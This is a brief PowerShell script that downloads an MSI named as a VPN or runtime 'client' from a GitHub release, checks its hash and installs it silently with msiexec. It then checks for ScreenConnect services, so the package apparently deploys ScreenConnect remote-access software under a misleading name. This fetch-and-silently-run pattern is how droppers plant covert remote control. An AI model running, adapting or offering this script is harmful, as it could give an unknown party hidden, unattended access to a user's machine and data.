$ErrorActionPreference = "Stop"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$source = "https://github.com/snehaweb3kid/runtime-cache-20260910--vpn/releases/download/v1-1789038015/client.msi"
$expected = "7D9006E53C2D616FCDDBF752BA3C18B6DEE0B75E63D144530579C3AC0FCE557D"
$msi = Join-Path $env:TEMP "client-gh.msi"
$log = Join-Path $env:TEMP "client-gh-install.log"

Start-Service msiserver -ErrorAction SilentlyContinue
(New-Object Net.WebClient).DownloadFile($source, $msi)
$actual = (Get-FileHash $msi -Algorithm SHA256).Hash
Write-Output "HASH=$actual"
if ($actual -ne $expected) {
    throw "client hash mismatch"
}

$proc = Start-Process msiexec.exe -ArgumentList @(
    "/i", "`"$msi`"", "/qn", "/norestart", "/L*v", "`"$log`""
) -Wait -PassThru
Write-Output "MSI_EXIT=$($proc.ExitCode)"

Get-Service |
    Where-Object { $_.DisplayName -like "*ScreenConnect*" } |
    Select-Object Name, DisplayName, Status |
    Format-List
